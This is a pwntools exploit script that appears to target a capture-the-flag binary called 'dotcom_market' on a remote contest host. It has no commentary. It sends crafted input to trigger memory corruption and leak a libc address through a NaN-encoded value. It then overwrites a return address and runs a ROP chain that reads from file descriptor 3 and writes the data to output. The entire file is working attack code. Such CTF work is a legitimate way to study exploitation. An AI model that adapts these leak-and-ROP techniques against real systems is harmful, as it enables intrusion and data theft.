from pwn import *

#context.log_level = 'debug'

if args.LOCAL:
    io = process(['./dotcom_market'])
    if args.GDB:
        cmd = """
        b* crash_handler
        """
        gdb.attach(io, cmd)
else:
    io = remote("dotcom.shellweplayaga.me", 10001)

elf = context.binary = ELF("./dotcom_market")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def import_module(model):
    io.sendlineafter(b'> ', b'0')
    io.sendlineafter(b'| ', model)    
    
def trasting(idx):
    io.sendlineafter(b'> ', b'66')
    io.sendlineafter(b'> ', str(idx).encode())

io.sendlineafter(b'| ', b'aaaa')

model = b'0|0|0|0|0|'+b'A'*0x400
import_module(str(len(model)).encode()+b'|'+model)
import_module(str(len(model)).encode()+b'|'+model)

trasting(1)

NaN = struct.unpack("Q", struct.pack("d", float('nan')))[0]
print(hex(NaN))

model = str(NaN).encode() + b'|0|0|0|0|' + b'A'*0x400

import_module(str(len(model)).encode()+b'|'+model)

io.sendlineafter(b'> ', b'1')
io.recvuntil(b'r = ')

leak = float(io.recvuntil(b" ", drop=True).decode())
libc.address = u64(struct.pack("d", leak * (-20))) & ~0xfff - 0x21a000

log.info("libc " + hex(libc.address))

io.sendlineafter(b'> ', b'1')

pl = b'1280|'
pl += b'(): Asse' + b'A'*0x30
pl += p64(0x4025A1)
pl += b'X'*(1284 - len(pl))
import_module(pl)

rop = ROP(libc)
rop.read(3, libc.bss(), 0x100)
rop.write(1, libc.bss(), 0x100)
pl = 24*b'A'
pl += bytes(rop)

io.sendline(pl)


io.interactive()